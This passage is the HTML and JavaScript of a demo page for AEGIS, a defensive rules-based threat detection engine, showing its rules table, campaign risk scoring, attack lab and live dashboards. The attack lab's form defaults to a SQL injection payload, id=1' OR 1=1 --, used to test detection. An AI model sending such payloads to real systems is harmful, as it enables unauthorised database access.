        <p>The same injection, but from a known-bad address, using the sqlmap tool. Three rules agree, the score passes 100, and the address is blocked for 10 minutes.</p>
        <button class="btn sm alt" data-scn="scanner">Run it</button>
      </div>
      <div class="ex">
        <h3>Password guessing</h3>
        <div class="sum">10 + 7 &times; 5 <span>= 45</span></div>
        <div class="light" data-ruler="45"></div>
        <p>Twelve failed logins in two minutes. Points grow with each attempt but stop at 50, so guessing alone never blocks. That gap is exactly what the campaign view below closes.</p>
        <button class="btn sm alt" data-scn="guess">Run it</button>
      </div>
    </div>
  </div>
</section>

<section class="s" id="rules">
  <div class="wrap">
    <div class="sh">
      <div><h2>Every rule, with its limits</h2></div>
      <p>All <span id="ruleCount2">36</span> rules in one table: when each fires, how many points it adds, where it sits in the attack chain, and the closest MITRE ATT&amp;CK technique. The last column says where the rule can be wrong. We list that ourselves because a judge will ask.</p>
    </div>
    <div class="filters">
      <input type="search" id="rq" placeholder="Search rules, e.g. powershell, T1110, port" aria-label="Search rules">
      <select id="ro" aria-label="Filter by origin"><option value="">All origins</option><option value="core">Core detectors</option><option value="aegis">AEGIS rules</option></select>
      <select id="rs" aria-label="Filter by attack stage"><option value="">All stages</option></select>
      <select id="rf" aria-label="Filter by family"><option value="">All families</option></select>
      <span class="mut small" id="rcount"></span>
    </div>
    <div class="tbl-wrap scroll-y">
      <table class="t compact" id="ruleTable">
        <thead><tr><th>Rule</th><th>Fires when</th><th>Points</th><th>Chain stage</th><th>MITRE ATT&amp;CK</th><th>Where it can be wrong</th></tr></thead>
        <tbody></tbody>
      </table>
    </div>
  </div>
</section>

<section class="s" id="campaigns">
  <div class="wrap">
    <div class="sh">
      <div><h2>Catching what a per-event score misses</h2></div>
      <p>The engine scores each event alone, so an attacker who spreads the steps out can stay below the block line every single time. The campaign view looks at everything one address has done and asks how far along the attack chain it has got.</p>
    </div>
    <div class="chain" id="chain"></div>
    <div class="cols even">
      <div class="formula">
        <h3 style="margin-bottom:10px">How campaign risk is calculated</h3>
        <ol>
          <li>Collect the distinct rules this address has triggered.</li>
          <li>Weight each: its strongest points, times a repeat bonus (up to &times;2), times a recency factor that halves every <span id="halfLife">10</span> minutes.</li>
          <li>Add <span id="stageBonus">15</span> for every extra chain stage reached.</li>
          <li>Below <span id="escAt">80</span> keep watching. From <span id="escAt2">80</span> escalate. From <span id="blkAt">150</span> a block is recommended.</li>
        </ol>
<div class="eq">evidence(rule) = strongest points x repeat(n) x 0.5 ^ (age / 10 min)
repeat(n)     = min(2, 1 + 0.1 x (n - 1))
risk          = sum of evidence + 15 x (stages reached - 1)</div>
      </div>
      <div>
        <div class="note info"><b>Advisory by design.</b> Campaign risk does not block anything yet, so the original engine behaves exactly as before. Wiring it into the response step is the first item on the roadmap.</div>
        <p class="mut small">Why these numbers: the repeat bonus makes persistence count, because ten SQL injections are worse than one. The decay stops a quiet address from being punished for something it did an hour ago. The stage bonus rewards progress along the chain, which is what separates a campaign from noise.</p>
      </div>
    </div>
    <h3 style="margin:36px 0 12px">Campaigns right now <span class="mut small" style="font-weight:400">&mdash; last hour, live</span></h3>
    <div class="tbl-wrap scroll-y">
      <table class="t compact" id="campTable">
        <thead><tr><th>Address</th><th>Chain</th><th>Risk</th><th>Verdict</th><th>Original engine</th><th>Strongest evidence</th></tr></thead>
        <tbody><tr><td colspan="6" class="mut">Loading&hellip;</td></tr></tbody>
      </table>
    </div>
  </div>
</section>

<section class="s tight" id="lab" style="background:#E5EBF1">
  <div class="wrap">
    <div class="sh">
      <div><h2>Attack lab</h2></div>
      <p>Fire a real attack at the real engine and watch it decide. Each step goes through the same pipeline as live traffic, from a random test address, and is labelled <span class="src API" style="background:#fff">API</span> on the dashboards. Start with the quiet intrusion: no single step is blocked, but the campaign view sees all five stages.</p>
    </div>
    <div class="lab dark">
      <div class="lab-side">
        <h3>Scenarios</h3>
        <div id="scList"></div>
        <details class="custom">
          <summary>Custom event</summary>
          <div class="fld">
            <div><label for="cKind">Type</label><select id="cKind">
              <option value="web">Web request</option><option value="auth_fail">Failed login</option><option value="auth_ok">Successful login</option>
              <option value="port">Port probe</option><option value="download">File download</option><option value="process">Windows process</option><option value="win">Windows event</option></select></div>
            <div><label for="cA">Path / image / group</label><input id="cA" value="/search"></div>
            <div><label for="cB">Body / command line</label><input id="cB" value="id=1' OR 1=1 --"></div>
            <div><label for="cC">Port / event id / file</label><input id="cC" value=""></div>
          </div>
          <button class="btn sm on-dark" id="cSend">Send event</button>
        </details>
      </div>
      <div class="lab-main">
        <div class="lab-bar">
          <span class="mut small">Actor</span><span class="ip" id="labIp">&ndash;</span>
          <span class="sp"></span>
          <button class="btn sm on-dark" id="labRun" disabled>Run scenario</button>
          <button class="btn sm ghost-dark" id="labStop" disabled>Stop</button>
          <button class="btn sm ghost-dark" id="labNew">New address</button>
        </div>
        <div class="lab-top">
          <div><h4>Selected event</h4><div id="labEvent"><div class="empty">Choose a scenario and press Run.</div></div></div>
          <div><h4>This actor across the attack chain</h4><div id="labChain"><div class="empty">The chain fills in as steps arrive.</div></div></div>
        </div>
        <div class="log" id="labLog"></div>
        <div class="final" id="labFinal" hidden></div>
      </div>
    </div>
  </div>
</section>

<section class="s dark" id="live">
  <div class="wrap">
    <div class="sh">
      <div><h2>Live operations</h2></div>
      <p>Everything here is read from the running engine, refreshed every few seconds. The built-in simulator keeps traffic flowing, and every event carries its source label so demo traffic is never mistaken for real telemetry.</p>
    </div>
    <div class="filters" style="margin-bottom:14px">
      <label class="small mut" for="range">Time range</label>
      <select id="range" style="background:#0b1826;border-color:var(--conline);color:var(--context)">
        <option value="15">Last 15 minutes</option><option value="60" selected>Last hour</option><option value="360">Last 6 hours</option><option value="1440">Last 24 hours</option><option value="0">Everything stored</option>
      </select>
      <span class="sp" style="flex:1"></span>
      <a class="btn sm ghost-dark" href="/aegis">Open full SOC console</a>
      <a class="btn sm ghost-dark" href="/map">Open threat map</a>
    </div>
    <div class="kpis" id="kpis"></div>
    <div class="live-grid">
      <div class="panel">
        <h3>Alerts over time <span class="sp"></span><span class="tiny" id="chartNote"></span></h3>
        <canvas class="chart" id="chart" aria-label="Alerts per interval by level, with maximum risk score line" role="img"></canvas>
        <div class="legend"><span><i style="background:var(--dcrit)"></i>Critical</span><span><i style="background:var(--dhigh)"></i>High</span><span><i style="background:var(--dmed)"></i>Medium</span><span><i style="background:var(--dlow)"></i>Low</span><span><i style="background:#fff;height:2px;vertical-align:3px"></i>Highest score in interval</span></div>
      </div>
      <div class="panel">
        <h3>Most common rules <span class="sp"></span><span class="tiny">by number of different sources</span></h3>
        <div id="topRules"></div>
        <h3 style="margin-top:18px">Attack chain coverage <span class="sp"></span><span class="tiny">events touching each stage</span></h3>
        <div id="stageBars"></div>
      </div>
    </div>
    <div class="live-grid">
      <div class="panel">
        <h3>Recent detections <span class="sp"></span><span class="tiny">click a row to see every rule behind the score</span></h3>
        <div class="feed" id="feed"></div>
      </div>
      <div class="panel">
        <h3>Data sources</h3>
        <div id="sources"></div>
        <div class="note info" style="background:#0F2033;color:var(--context);border-left-color:var(--dbrand);margin-bottom:0">
          <span class="src OBSERVED">Observed</span> read from a real log &nbsp; <span class="src API">API</span> submitted over HTTP, unverified &nbsp; <span class="src SIMULATED">Simulated</span> built-in generators.
        </div>
      </div>
    </div>
  </div>
</section>

<section class="s" id="proof">
  <div class="wrap">
    <div class="sh">
      <div><h2>Proof, and what we do not claim</h2></div>
      <p>The self-test below runs <em>right now</em> against the real rule code: attacks that must fire, near-misses that must stay quiet, and a few false positives we know about and chose to document.</p>
    </div>
    <div class="score-banner">
      <span class="big" id="stBig">&ndash;</span>
      <div><b id="stLine">Running verification&hellip;</b><div class="mut small" id="stSub"></div></div>
      <span style="flex:1"></span>
      <button class="btn sm alt" id="stRun">Run again</button>
    </div>
    <div class="filters">
      <input type="search" id="stq" placeholder="Filter cases, e.g. SQL, powershell" aria-label="Filter test cases">
      <select id="stk" aria-label="Filter by case type"><option value="">All case types</option><option value="attack">Attacks that must fire</option><option value="benign">Near-misses that must stay quiet</option><option value="known-limit">Documented false positives</option></select>
    </div>
    <div class="tbl-wrap scroll-y" style="max-height:420px">
      <table class="t compact" id="stTable">
        <thead><tr><th>Result</th><th>Rule</th><th>Type</th><th>Case</th><th>Input</th><th>Points</th></tr></thead>
        <tbody></tbody>
      </table>
    </div>

    <div class="two" style="margin-top:48px">
      <div>
        <h3>What we do not claim</h3>
        <ul class="lines">
          <li><b>Locations are estimates.</b> Without a GeoIP database, real events are not plotted at all, and simulated events are drawn hollow.</li>
          <li><b>Host rules are heuristics.</b> Admin tools can trigger them, which is why they add points rather than block alone.</li>
          <li><b>Weights are set by hand, not trained.</b> This is a transparent rules engine, not a machine-learning model, and signatures can be evaded by a determined attacker.</li>
          <li><b>Campaign risk is advisory.</b> It flags and ranks. It does not block yet.</li>
          <li><b>Three rules are outside the self-test:</b> <span id="stNot">clock, baseline and feed dependent</span>.</li>
        </ul>
      </div>
      <div>
        <h3>Known limits, stated up front</h3>
        <ul class="lines">
          <li>Impossible-login tracking is per IP address, not per account.</li>
          <li>The SQL rule matches the text <code>--</code>, so ordinary prose can trigger it.</li>
          <li>Brute force alone tops out at 50 points by design and never blocks. The campaign view is what escalates it.</li>
          <li>State lives in memory. A restart clears history unless alert persistence is on.</li>
        </ul>
      </div>
    </div>
  </div>
</section>

<section class="s" id="impact" style="border-bottom:0">
  <div class="wrap">
    <div class="sh">
      <div><h2>Who it protects, and how to run it</h2></div>
      <p>Small businesses, clinics, colleges and local government offices run the same servers attackers target, but cannot pay for a SIEM licence or a security team. AEGIS runs on a single Java installation. No cloud account, no API key, and logs never leave the machine.</p>
    </div>
    <div class="two">
      <div>
        <h3>Run it</h3>
<pre class="cmd"><i># compile and start (JDK 21, nothing to download)</i>
javac -d out $(find src -name "*.java")
java -cp out com.threatdetection.Main

<i># point it at real logs instead of the simulator</i>
java -Daegis.web.log=/var/log/nginx/access.log \\
     -Daegis.fw.log=/var/log/ufw.log \\
     -cp out com.threatdetection.Main</pre>
        <p class="mut small">Pages: <a href="/">this site</a>, <a href="/aegis">/aegis</a> SOC console, <a href="/map">/map</a> threat map, <a href="/classic">/classic</a> original dashboard. API: <a href="/api/platform/model">/api/platform/model</a>, <a href="/api/platform/campaigns">/api/platform/campaigns</a>, <a href="/api/platform/selftest">/api/platform/selftest</a>.</p>
      </div>
      <div>
        <h3>Built, and next</h3>
        <ul class="cl">
          <li><b><span class="st done">Built</span></b><span><span id="ruleCount3">36</span> rules in two layers, mapped to MITRE ATT&amp;CK</span></li>
          <li><b><span class="st done">Built</span></b><span>Five log sources, normalised into one event model</span></li>
          <li><b><span class="st done">Built</span></b><span>Campaign correlation across a five-stage attack chain</span></li>
          <li><b><span class="st done">Built</span></b><span>Attack lab and a self-test that runs against the live code</span></li>
          <li><b><span class="st next">Next</span></b><span>Let campaign risk drive the block decision, behind a switch</span></li>
          <li><b><span class="st next">Next</span></b><span>Impossible-login tracking per account instead of per IP</span></li>
          <li><b><span class="st next">Next</span></b><span>Database storage (JDBC) and export to SIEM tools in CEF or syslog</span></li>
          <li><b><span class="st next">Next</span></b><span>Linux auditd and cloud audit logs as new sources</span></li>
        </ul>
      </div>
    </div>
  </div>
</section>
</main>

<footer>
  <div class="wrap">
    <span>AEGIS &mdash; explainable threat detection in plain Java.</span>
    <span><a href="#top">Back to top</a><a href="/classic">Original dashboard</a></span>
  </div>
</footer>

<script>
(function () {
  'use strict';
  var $ = function (s, r) { return (r || document).querySelector(s); };
  var $$ = function (s, r) { return Array.prototype.slice.call((r || document).querySelectorAll(s)); };
  function esc(s) { return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) { return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]; }); }
  function get(url) { return fetch(url, { cache: 'no-store' }).then(function (r) { if (!r.ok) throw new Error(r.status); return r.json(); }); }
  function post(url, obj) {
    var body = new URLSearchParams(obj).toString();
    return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body })
      .then(function (r) { return r.json().then(function (j) { if (!r.ok) throw new Error(j.error || r.status); return j; }); });
  }
  function ago(ts) {
    var s = Math.max(0, Math.round((Date.now() - ts) / 1000));
    if (s < 5) return 'just now'; if (s < 60) return s + 's ago'; if (s < 3600) return Math.round(s / 60) + ' min ago';
    return Math.round(s / 3600) + ' h ago';
  }
  function sl(x) { return x === 'API' ? 'API' : x.charAt(0) + x.slice(1).toLowerCase(); }
  function num(n) { return Number(n || 0).toLocaleString('en-IN'); }
  var STAGE = {}, STAGE_ORDER = [], MODEL = null;
  var SCALE = 140;
  var SHORT = { recon: 'Recon', access: 'Initial access', exec: 'Execution', persist: 'Persistence', impact: 'Impact' };
  var BANDS = [['safe', 0, 20, 'SAFE'], ['low', 20, 50, 'LOW'], ['med', 50, 80, 'MEDIUM'], ['high', 80, 100, 'HIGH'], ['crit', 100, 140, 'CRITICAL']];

  /* ---------- risk ruler ---------- */
  function rulerHtml(score, level) {
    var segs = BANDS.map(function (b) {
      var w = (b[2] - b[1]) / SCALE * 100;
      return '<i class="' + b[0] + '" style="width:' + w + '%">' + (w > 13 ? b[3] : '') + '</i>';
    }).join('');
    var ticks = [0, 20, 50, 80, 100, 140].map(function (t) {
      return '<span style="left:' + (t / SCALE * 100) + '%">' + (t === 140 ? '' : t) + '</span>';
""";

    private static final String P2 = """
    }).join('');
    var pos = Math.min(score, SCALE) / SCALE * 100;
    return '<div class="ruler" role="img" aria-label="Risk score ' + score + ', ' + esc(level || '') + '">' +
      '<div class="ruler-track">' + segs + '</div><div class="ruler-ticks">' + ticks + '</div>' +
      '<div class="needle" style="left:' + pos + '%"><b>' + score + '</b></div></div>';
  }
  function levelOf(score) { return score <= 20 ? 'SAFE' : score <= 50 ? 'LOW' : score <= 80 ? 'MEDIUM' : score <= 100 ? 'HIGH' : 'CRITICAL'; }
  function setRuler(host, score, level) {
    var n = $('.needle', host);
    if (!n) { host.innerHTML = rulerHtml(score, level); return; }
    n.style.left = (Math.min(score, SCALE) / SCALE * 100) + '%';
    $('b', n).textContent = score;
    $('.ruler', host).setAttribute('aria-label', 'Risk score ' + score + ', ' + level);
  }
  function ledgerHtml(ev) {
    if (!ev.rules.length) return '<div class="empty">No rule fired. Score 0, nothing to explain.</div>';
    var rows = ev.rules.map(function (r) {
      return '<tr><td class="pts">+' + r.score + '</td><td class="rn"><span class="chip ' + r.origin + '">' + esc(r.rule) + '</span></td><td class="dt">' + esc(r.detail) +
        (r.technique ? ' <span class="tiny">(' + esc(r.technique.split(' ')[0]) + ')</span>' : '') + '</td></tr>';
    }).join('');
    var sum = ev.rules.reduce(function (a, r) { return a + r.score; }, 0);
    var foot = '<tfoot><tr><td class="pts">' + ev.score + '</td><td colspan="2" class="dt">' + (sum === ev.score ? 'total score' : 'total score (the original engine rejected this request before scoring)') + '</td></tr></tfoot>';
    return '<table class="ledger"><tbody>' + rows + '</tbody>' + foot + '</table>';
  }
  var MEANING = { SAFE: 'Logged only.', LOW: 'Logged and shown on the dashboard.', MEDIUM: 'Alert for an analyst to review.', HIGH: 'Urgent alert.', CRITICAL: 'Source address blocked for 10 minutes.' };
  function verdictHtml(ev) {
    var l = ev.level.toLowerCase();
    return '<div class="verdict v-' + l + '"><span class="lvl ' + ev.level + '">' + ev.level + '</span><span>' + (ev.blocked ? 'Blocked for 10 minutes.' : (MEANING[ev.level] || '')) + '</span></div>';
  }
  function eventPanel(ev) {
    return '<div class="actor"><span class="ip">' + esc(ev.ip || 'host event') + '</span><span class="src ' + ev.source + '">' + sl(ev.source) + '</span>' +
      (ev.place && ev.geoClass !== 'UNAVAILABLE' ? '<span class="tiny mut">' + esc(ev.place) + (ev.geoClass === 'SIMULATED' ? ' (demo location)' : ' (estimated)') + '</span>' : '') + '</div>' +
      '<div class="evsum">' + esc(ev.summary) + '</div>' +
      '<div data-host>' + rulerHtml(ev.score, ev.level) + '</div>' + ledgerHtml(ev) + verdictHtml(ev);
  }

  /* ---------- model ---------- */
  function loadModel() {
    return get('/api/platform/model').then(function (m) {
      MODEL = m;
      m.stages.forEach(function (s, i) { STAGE[s.id] = s; s.idx = i; STAGE_ORDER.push(s.id); });
      ['ruleCount', 'ruleCount2', 'ruleCount3'].forEach(function (id) { var e = document.getElementById(id); if (e) e.textContent = m.counts.total; });
      $('#halfLife').textContent = m.campaign.halfLifeMinutes; $('#stageBonus').textContent = m.campaign.stageBonus;
      $('#escAt').textContent = m.campaign.escalateAt; $('#escAt2').textContent = m.campaign.escalateAt; $('#blkAt').textContent = m.campaign.blockAt;
      renderBands(); renderRulesFilters(); renderRules(); renderChain(); renderExamples();
    });
  }
  function renderBands() {
    $('#bandRuler').innerHTML = rulerHtml(0, 'SAFE');
    $('#bandList').innerHTML = MODEL.bands.map(function (b) {
      return '<div><b>' + b.level + '</b><span class="r">' + b.from + (b.level === 'CRITICAL' ? '+' : '&ndash;' + b.to) + '</span><br>' + esc(b.meaning) + '</div>';
    }).join('');
  }
  function renderExamples() { $$('[data-ruler]').forEach(function (h) { var s = +h.getAttribute('data-ruler'); h.innerHTML = rulerHtml(s, levelOf(s)); }); }

  /* ---------- stepper ---------- */
  var STEPS = [
    { t: 'Collect', s: 'Five sources feed one pipeline', d: 'Web access logs (Apache or Nginx), firewall logs (Windows or Linux), the Windows Security log, Sysmon process events, and an HTTP API. Files are followed live like <code>tail -f</code>; Windows logs are read through the event log.', w: 'Different tools see different parts of an attack. A web log shows the exploit, the firewall shows the scan, Sysmon shows what ran afterwards.', c: ['aegis/ingest/FileTailer', 'aegis/ingest/WindowsEventSource', 'server/ApiServer'] },
    { t: 'Normalise', s: 'Every line becomes one signal', d: 'Each parser turns its raw line into the same small record: kind (web, logon, network, process, audit), address, user, path, command line, port, time. Nothing downstream cares which log it came from.', w: 'One event model means one set of rules works on every source, and adding a new source later means writing only a parser.', c: ['aegis/AegisSignal', 'aegis/ingest/WebAccessLogParser', 'aegis/ingest/FirewallLogParser'] },
    { t: 'Detect', s: '36 rules look independently', d: 'Eleven core detectors and twenty-five AEGIS rules each inspect the signal on their own and return either nothing or points plus the reason. Core detectors keep per-address memory: failed logins, request rate, ports touched, last country, and a running average for anomaly checks.', w: 'Independent rules are easy to test, easy to explain, and one bad rule cannot break the others. Mixing signature, threshold and anomaly rules means evading one style does not evade them all.', c: ['detector/*', 'aegis/rules/*', 'tracking/IpActivityTracker'] },
    { t: 'Score', s: 'Add the points, pick a band', d: 'The score is the sum of every rule that fired. AEGIS rules add their points on top of the core result, and an AEGIS finding is never labelled SAFE. Bands: 0&ndash;20 SAFE, 21&ndash;50 LOW, 51&ndash;80 MEDIUM, 81&ndash;100 HIGH, 101 and above CRITICAL.', w: 'Additive scoring is how real SIEM tools work. It makes false positives cheap (one weak rule cannot block) and evasion expensive (the attacker must stay under every threshold at once).', c: ['engine/RiskScoreEngine', 'engine/ThreatClassifier', 'aegis/AegisPipeline'] },
    { t: 'Respond', s: 'Block only on strong evidence', d: 'A CRITICAL result blocks the source address for 10 minutes. While blocked, further requests are rejected before any analysis, which also protects the engine from a flood.', w: 'Blocking is the only step that can hurt a real user, so it is gated behind the highest band and expires on its own.', c: ['response/AutoResponseService', 'engine/ThreatDetectionEngine'] },
    { t: 'Correlate', s: 'Explain it, place it, connect it', d: 'The result is enriched with reputation from threat-intel feeds (or an honest &ldquo;no data&rdquo;), an estimated location, and grouped into incidents. The campaign correlator then links all events from one address across the five-stage attack chain and ranks them.', w: 'Per-event scoring is blind to patience. Correlation over time is what catches the attacker who takes it slowly.', c: ['aegis/intel/ReputationService', 'aegis/storage/AegisStore', 'platform/CampaignAnalyzer'] }
  ];
  function renderSteps() {
    var ol = $('#steps');
    ol.innerHTML = STEPS.map(function (s, i) {
      return '<li role="presentation"><button role="tab" aria-selected="' + (i === 0) + '" data-i="' + i + '"><span class="n">' + (i + 1) + '</span><span><span class="tt">' + s.t + '</span><span class="ss">' + s.s + '</span></span></button></li>';
    }).join('');
    function show(i) {
      var s = STEPS[i];
      $$('button', ol).forEach(function (b) { b.setAttribute('aria-selected', String(+b.getAttribute('data-i') === i)); });
      $('#stepDetail').innerHTML = '<h3>' + (i + 1) + '. ' + s.t + '</h3><p>' + s.d + '</p><dl><dt>Why this design</dt><dd>' + s.w + '</dd><dt>Where in the code</dt><dd class="codes">' + s.c.map(function (c) { return '<code>' + c + '</code>'; }).join('') + '</dd></dl>';
    }
    ol.addEventListener('click', function (e) { var b = e.target.closest('button'); if (b) show(+b.getAttribute('data-i')); });
    show(0);
  }

  /* ---------- rules table ---------- */
  function renderRulesFilters() {
    $('#rs').innerHTML = '<option value="">All stages</option>' + MODEL.stages.map(function (s) { return '<option value="' + s.id + '">' + esc(s.name) + '</option>'; }).join('') + '<option value="none">Context only</option>';
    var fam = {}; MODEL.rules.forEach(function (r) { fam[r.family] = 1; });
    $('#rf').innerHTML = '<option value="">All families</option>' + Object.keys(fam).map(function (f) { return '<option>' + f + '</option>'; }).join('');
    ['rq', 'ro', 'rs', 'rf'].forEach(function (id) { $('#' + id).addEventListener('input', renderRules); });
  }
  function renderRules() {
    var q = $('#rq').value.toLowerCase(), o = $('#ro').value, s = $('#rs').value, f = $('#rf').value;
    var rows = MODEL.rules.filter(function (r) {
      if (o && r.origin !== o) return false; if (f && r.family !== f) return false;
      if (s === 'none' ? r.stage : (s && r.stage !== s)) return false;
      return !q || (r.id + ' ' + r.trigger + ' ' + r.technique + ' ' + r.caution + ' ' + r.family).toLowerCase().indexOf(q) >= 0;
    });
    $('#ruleTable tbody').innerHTML = rows.map(function (r) {
      var pts = r.min === r.max ? '+' + r.min : r.min + '&ndash;' + r.max;
      return '<tr><td><span class="rule-id">' + r.id + '</span><br><span class="chip ' + r.origin + ' lt">' + (r.origin === 'core' ? 'core' : 'aegis') + '</span> <span class="tag">' + r.family + '</span></td>' +
        '<td>' + esc(r.trigger) + '</td><td class="pts-cell">' + pts + '</td><td>' + (r.stage ? esc(STAGE[r.stage].name) : '<span class="mut">context signal</span>') + '</td>' +
        '<td class="tech">' + (esc(r.technique) || '<span class="mut">&ndash;</span>') + '</td><td class="caution">' + esc(r.caution) + '</td></tr>';
    }).join('') || '<tr><td colspan="6" class="mut">No rule matches those filters.</td></tr>';
    $('#rcount').textContent = 'Showing ' + rows.length + ' of ' + MODEL.rules.length;
  }

  /* ---------- chain + campaigns ---------- */
  function renderChain() {
    $('#chain').innerHTML = MODEL.stages.map(function (s, i) {
      var n = MODEL.rules.filter(function (r) { return r.stage === s.id; }).length;
      return '<div class="node"><span class="dotn">' + (i + 1) + '</span><h3>' + esc(s.name) + '</h3><p>' + esc(s.summary) + '</p><span class="cnt">' + n + ' rules</span> <span class="cnt" data-cnt="' + s.id + '"></span></div>';
    }).join('');
  }
  function stg(list) { return '<span class="stg" title="' + list.length + ' of 5 stages">' + STAGE_ORDER.map(function (id) { return '<i class="' + (list.indexOf(id) >= 0 ? 'on' : '') + '" title="' + esc(STAGE[id].name) + '"></i>'; }).join('') + '</span>'; }
  function meterHtml(risk) {
    var max = 220, w = Math.min(100, risk / max * 100), cls = risk >= MODEL.campaign.blockAt ? 'block' : risk >= MODEL.campaign.escalateAt ? 'escalate' : '';
    return '<div class="meter"><i class="' + cls + '" style="width:' + w + '%"></i><u style="left:' + (MODEL.campaign.escalateAt / max * 100) + '%"></u><u style="left:' + (MODEL.campaign.blockAt / max * 100) + '%"></u></div>';
  }
  function renderCampaigns(list) {
    var counts = {}; list.forEach(function (c) { c.stages.forEach(function (s) { counts[s] = (counts[s] || 0) + 1; }); });
    $$('[data-cnt]').forEach(function (e) { var n = counts[e.getAttribute('data-cnt')] || 0; e.textContent = n ? '\\u00b7 ' + n + ' address' + (n > 1 ? 'es' : '') + ' reached it' : ''; });
    var body = list.slice(0, 8).map(function (c) {
      var top = c.rules.slice().sort(function (a, b) { return b.weight - a.weight; }).slice(0, 3).map(function (r) { return '<span class="chip ' + r.origin + ' lt">' + r.rule + '</span>'; }).join(' ');
      var eng = c.blockedByEngine ? 'Blocked' : (c.engineMissed ? '<span class="missed">Not blocked, risk says block</span>' : 'Not blocked');
      return '<tr><td><span class="mono">' + esc(c.actor) + '</span><br>' + c.sources.map(function (s) { return '<span class="src ' + s + '">' + sl(s) + '</span>'; }).join(' ') + '</td><td>' + stg(c.stages) + '</td>' +
        '<td style="min-width:150px"><b class="mono">' + c.risk + '</b> <span class="act ' + c.action + '">' + c.action + '</span>' + meterHtml(c.risk) + '</td><td>' + esc(c.verdict) + '<br><span class="tiny mut">' + c.detections + ' detections</span></td><td>' + eng + '</td><td>' + top + '</td></tr>';
    }).join('');
    $('#campTable tbody').innerHTML = body || '<tr><td colspan="6" class="mut">No detections in the last hour yet.</td></tr>';
  }

  /* ---------- hero + live ---------- */
  var heroId = 0, heroAt = 0;
  function renderHero(recent) {
    if (!recent.length) return;
    var pool = recent.slice(0, 6).sort(function (a, b) { return b.score - a.score; });
    var pick = pool[0];
    var fresh = recent.find(function (e) { return e.source === 'API' && Date.now() - e.ts < 8000; });
    if (fresh) pick = fresh;
    if (pick.id === heroId) { $('#heroWhen').textContent = ago(pick.ts); return; }
    if (!fresh && Date.now() - heroAt < 5000) return;
    heroId = pick.id; heroAt = Date.now();
    var host = $('#hero'), first = !$('.needle', host);
    if (first) { host.innerHTML = eventPanel(pick); void $('.needle', host).offsetWidth; }
    else {
      host.innerHTML = eventPanel(pick);
    }
    $('#heroWhen').textContent = ago(pick.ts);
  }
  function renderKpis(d) {
    var w = d.window, alerts = w.critical + w.high + w.medium + w.low;
    var items = [[num(d.analyzed), 'events analysed since start'], [num(alerts), 'alerts in range (LOW and above)'], [num(w.critical + w.high), 'high or critical'], [num(d.blockedIps), 'addresses blocked now'], [num(d.openIncidents), 'incidents open']];
    $('#kpis').innerHTML = items.map(function (i) { return '<div class="kpi"><div class="v">' + i[0] + '</div><div class="l">' + i[1] + '</div></div>'; }).join('');
  }
  function drawChart(series) {
    var cv = $('#chart'), dpr = window.devicePixelRatio || 1, W = cv.clientWidth, H = cv.clientHeight;
    if (!W) return; cv.width = W * dpr; cv.height = H * dpr;
    var g = cv.getContext('2d'); g.setTransform(dpr, 0, 0, dpr, 0, 0); g.clearRect(0, 0, W, H);
    var L = 34, R = 34, T = 8, B = 20, pw = W - L - R, ph = H - T - B;
    var maxC = 1; series.forEach(function (r) { maxC = Math.max(maxC, r[4] + r[5] + r[6] + r[7]); });
    g.font = '11px sans-serif'; g.fillStyle = '#8FA7BF'; g.strokeStyle = '#27425D'; g.lineWidth = 1;
    for (var i = 0; i <= 4; i++) {
      var y = T + ph - ph * i / 4; g.beginPath(); g.moveTo(L, y); g.lineTo(L + pw, y); g.stroke();
      g.textAlign = 'right'; g.fillText(Math.round(maxC * i / 4), L - 6, y + 4);
      g.textAlign = 'left'; g.fillText(Math.round(SCALE * i / 4), L + pw + 6, y + 4);
    }
    var n = series.length, bw = Math.max(2, pw / n - 2);
    var cols = ['#4ca7f0', '#F2BE2E', '#FF8A3D', '#FF5A5F'];
    series.forEach(function (r, k) {
      var x = L + pw * k / n + 1, base = T + ph, vals = [r[7], r[6], r[5], r[4]];
      vals.forEach(function (v, j) { var h = v / maxC * ph; g.fillStyle = cols[j]; g.fillRect(x, base - h, bw, h); base -= h; });
    });
    g.strokeStyle = '#fff'; g.lineWidth = 1.5; g.beginPath(); var started = false;
    series.forEach(function (r, k) { if (!r[1]) return; var x = L + pw * (k + .5) / n, y = T + ph - Math.min(r[3], SCALE) / SCALE * ph; if (!started) { g.moveTo(x, y); started = true; } else g.lineTo(x, y); });
    g.stroke();
    var a = series.length ? new Date(series[0][0]) : null, b = series.length ? new Date(series[series.length - 1][0]) : null;
    g.fillStyle = '#8FA7BF'; g.textAlign = 'left'; if (a) g.fillText(a.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }), L, H - 4);
    g.textAlign = 'right'; if (b) g.fillText(b.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }), L + pw, H - 4);
    $('#chartNote').textContent = 'left axis: alerts, right axis: score';
  }
  function renderTop(d) {
    var max = 1; d.topRules.forEach(function (r) { max = Math.max(max, r.actors); });
    $('#topRules').innerHTML = d.topRules.map(function (r) {
      return '<div class="hbar"><span class="nm" title="' + r.rule + '">' + r.rule + '</span><span class="tr"><i class="' + r.origin + '" style="width:' + (r.actors / max * 100) + '%"></i></span><span class="ct">' + r.actors + ' src \\u00b7 ' + r.count + '</span></div>';
    }).join('') || '<div class="mut small">No rule has fired yet.</div>';
    var mx = 1; d.stages.forEach(function (s) { mx = Math.max(mx, s.events); });
    $('#stageBars').innerHTML = d.stages.map(function (s) {
      return '<div class="hbar"><span class="nm">' + (SHORT[s.id] || s.id) + '</span><span class="tr"><i class="core" style="width:' + (s.events / mx * 100) + '%"></i></span><span class="ct">' + s.events + '</span></div>';
    }).join('');
  }
  var openRow = null;
  function renderFeed(d) {
    var rows = d.recent.map(function (e) {
      var chips = e.rules.map(function (r) { return '<span class="chip ' + r.origin + '">' + r.rule + ' +' + r.score + '</span>'; }).join('');
      var main = '<tr class="row" data-id="' + e.id + '"><td>' + new Date(e.ts).toLocaleTimeString() + '</td><td><span class="ip">' + esc(e.ip || 'host') + '</span><br><span class="src ' + e.source + '">' + sl(e.source) + '</span></td><td><b class="mono">' + e.score + '</b> <span class="lvl ' + e.level + '">' + e.level + '</span>' + (e.blocked ? ' <span class="tag">blocked</span>' : '') + '</td><td><div class="chips">' + chips + '</div></td></tr>';
      var x = openRow === e.id ? '<tr class="x"><td colspan="4"><div class="evsum" style="margin-bottom:8px">' + esc(e.summary) + '</div>' + ledgerHtml(e) + '</td></tr>' : '';
      return main + x;
